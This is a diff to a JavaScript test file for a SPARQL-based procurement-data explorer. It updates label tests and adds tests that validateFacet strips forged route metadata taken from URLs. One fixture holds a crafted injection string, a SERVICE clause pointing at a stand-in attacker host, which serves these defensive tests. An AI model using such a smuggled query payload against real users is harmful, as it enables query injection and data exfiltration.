@@ -19,6 +19,7 @@
 
 import { test } from 'node:test';
 import assert from 'node:assert/strict';
+import { navigationPath } from '../src/js/utils/navigationPath.js';
 import {
   addUnique,
   createPublicationNumberFacet,
@@ -307,11 +308,11 @@ test('getLabel returns a human-readable string per facet kind', () => {
   const named  = { type: 'named-node', term: { value: EPO_NOTICE_URI } };
   assert.equal(getLabel(notice), PUB_2026);
   assert.equal(getLabel(query), 'Query');
-  // EPO_NOTICE_URI is `id_{uuid}_Notice` with no identifier suffix, so
-  // shortLabel has no underscore to split after the uuid and returns the
-  // bare type. URIs with identifiers (e.g. SettledContract_CON-0001) render
-  // as "Type identifier".
-  assert.equal(getLabel(named), 'Notice');
+  // EPO_NOTICE_URI is `id_{uuid}_Notice`: the source data gives a notice no
+  // identifier, so its URI ends at the class name. With no declared type to
+  // show either, the uuid is all that is left to name it by.
+  assert.equal(getLabel(named), '6497924e-6920-4348-8ecb-71530f802aef');
+  assert.equal(getLabel({ ...named, typeName: 'Notice16' }), 'Notice16');
 
   const contractFacet = {
     type: 'named-node',
@@ -320,7 +321,9 @@ test('getLabel returns a human-readable string per facet kind', () => {
         'http://data.europa.eu/a4g/resource/id_6497924e-6920-4348-8ecb-71530f802aef_SettledContract_CON-0001',
     },
   };
-  assert.equal(getLabel(contractFacet), 'SettledContract CON-0001');
+  // "SettledContract" is the mapping's name for the class, not the ontology's,
+  // so an unnamed resource shows the identifier alone.
+  assert.equal(getLabel(contractFacet), 'CON-0001');
 });
 
 test('getQuery returns the SPARQL body for each facet kind', () => {
@@ -556,4 +559,147 @@ test('addUnique Symbol-fallback: two malformed facets are never equal', () => {
   const { facets: after1 } = addUnique([], broken1);
   const { facets } = addUnique(after1, broken2);
   assert.equal(facets.length, 2);
+});
+
+// ── session-only route metadata ─────────────────────────────────────
+//
+// Tree clicks record how a resource was reached (viaPath / viaRoot /
+// viaRootPattern) so the SPARQL reference card can rebuild the property path.
+// That describes a live exploration and is deliberately kept out of shareable
+// URLs — so anything arriving over one is forged, and validateFacet is the
+// boundary that has to drop it.
+//
+// viaRootPattern is the dangerous one: the card interpolates it verbatim into
+// the Path row and offers it for copying, so a crafted ?facet= could put a
+// SERVICE clause aimed at an attacker's endpoint in front of a recipient,
+// presented as the app's own suggested query.
+
+const CRAFTED_ROUTE = {
+  viaPath: ['http://data.europa.eu/a4g/ontology#announcesRole'],
+  viaRoot: 'http://data.europa.eu/a4g/resource/id_x_Notice',
+  viaRootPattern: '?evil a epo:Notice . SERVICE <http://attacker.example/collect> { ?s ?p ?o } #',
+};
+
+test('validateFacet strips forged route metadata from a named-node facet', () => {
+  const cleaned = validateFacet({
+    type: 'named-node',
+    term: { termType: 'NamedNode', value: 'http://data.europa.eu/a4g/resource/id_x_Reviewer' },
+    ...CRAFTED_ROUTE,
+  });
+
+  assert.ok(cleaned, 'the facet itself is still valid');
+  for (const field of ['viaPath', 'viaRoot', 'viaRootPattern']) {
+    assert.ok(!(field in cleaned), `${field} does not cross the boundary`);
+  }
+});
+
+test('validateFacet strips route metadata from every facet type', () => {
+  const notice = validateFacet({ type: 'notice-number', value: '00100333-2025', ...CRAFTED_ROUTE });
+  const query = validateFacet({ type: 'query', query: 'SELECT * WHERE { ?s ?p ?o }', ...CRAFTED_ROUTE });
+
+  for (const cleaned of [notice, query]) {
+    assert.ok(cleaned);
+    assert.ok(!('viaRootPattern' in cleaned));
+  }
+});
+
+test('validateFacet keeps the fields it does not know about', () => {
+  // The spread is deliberate — timestamps and future fields must survive.
+  // Only the session-only ones are removed.
+  const cleaned = validateFacet({
+    type: 'notice-number',
+    value: '00100333-2025',
+    timestamp: 12345,
+    somethingElse: 'kept',
+    ...CRAFTED_ROUTE,
+  });
+
+  assert.equal(cleaned.timestamp, 12345);
+  assert.equal(cleaned.somethingElse, 'kept');
+  assert.ok(!('viaPath' in cleaned));
+});
+
+test('validateFacet does not mutate the object it was handed', () => {
+  const input = {
+    type: 'named-node',
+    term: { termType: 'NamedNode', value: 'http://data.europa.eu/a4g/resource/id_x_Reviewer' },
+    ...CRAFTED_ROUTE,
+  };
+  const snapshot = JSON.stringify(input);
+  validateFacet(input);
+  assert.equal(JSON.stringify(input), snapshot);
+});
+
+test('a forged route cannot reach the reference card', () => {
+  // End to end across the boundary: what initFromUrlParams would build from a
+  // crafted ?facet= plus ?root=, handed to the function that rebuilds the path.
+  const validated = validateFacet({
+    type: 'named-node',
+    term: { termType: 'NamedNode', value: 'http://data.europa.eu/a4g/resource/id_x_Reviewer' },
+    ...CRAFTED_ROUTE,
+  });
+  const breadcrumb = [{ type: 'notice-number', value: '00100333-2025' }, validated];
+
+  assert.deepEqual(navigationPath(breadcrumb, 1), { chain: [], anchor: null });
+});
+
+// ── naming a resource in the breadcrumb and heading (issue #74) ─────
+//
+// Both are built from getLabel(). A resource URI reads "id_{uuid}_{Type}_{id}",
+// where the class name is the mapping's rather than the ontology's. The name
+// shown comes from the types the resource declares and rides on the facet; the
+// identifier still comes from the URI, which is where it belongs.
+
+const CONTRACT_URI =
+  'http://data.europa.eu/a4g/resource/id_1a7fc6eb-fe1e_SettledContract_CON-0003';
+
+test('getLabel prefers the declared type over the name in the URI', () => {
+  assert.equal(
+    getLabel({ type: 'named-node', term: { value: CONTRACT_URI }, typeName: 'Contract' }),
+    'Contract CON-0003',
+  );
+});
+
+test('getLabel keeps the identifier from the URI', () => {
+  const label = getLabel({ type: 'named-node', term: { value: CONTRACT_URI }, typeName: 'Contract' });
+  assert.ok(label.endsWith('CON-0003'), label);
+});
+
+test('getLabel shows the identifier alone when no name was resolved', () => {
+  // Before the resource's own triples arrive, nothing states its class. The
+  // "SettledContract" in the URI is the mapping's name for it and is not
+  // shown in its place, here or on the badge.
+  assert.equal(getLabel({ type: 'named-node', term: { value: CONTRACT_URI } }), 'CON-0003');
+});
+
+test('a resource whose URI carries no identifier is named by its type alone', () => {
+  const uri = 'http://data.europa.eu/a4g/resource/id_1a7fc6eb-fe1e_Notice';
+  assert.equal(
+    getLabel({ type: 'named-node', term: { value: uri }, typeName: 'Notice16' }),
+    'Notice16',
+  );
+});
+
+test('with neither a type nor an identifier, the uuid is what is left', () => {
+  const uri = 'http://data.europa.eu/a4g/resource/id_1a7fc6eb-fe1e_Notice';
+  assert.equal(getLabel({ type: 'named-node', term: { value: uri } }), '1a7fc6eb-fe1e');
+});
+
+test('a URI of any other shape is shown as it is', () => {
+  // No class name is embedded in one, so there is nothing to withhold.
+  assert.equal(
+    getLabel({ type: 'named-node', term: { value: 'http://data.europa.eu/a4g/ontology#Notice' } }),
+    'epo:Notice',
+  );
+});
+
+test('a resolved name does not cross the URL boundary', () => {
+  // Same reasoning as the route metadata: it describes a live exploration, so
+  // a value arriving on a link is forged.
+  const cleaned = validateFacet({
+    type: 'named-node',
+    term: { termType: 'NamedNode', value: CONTRACT_URI },
+    typeName: 'Anything At All',
+  });
+  assert.ok(!('typeName' in cleaned));
 });
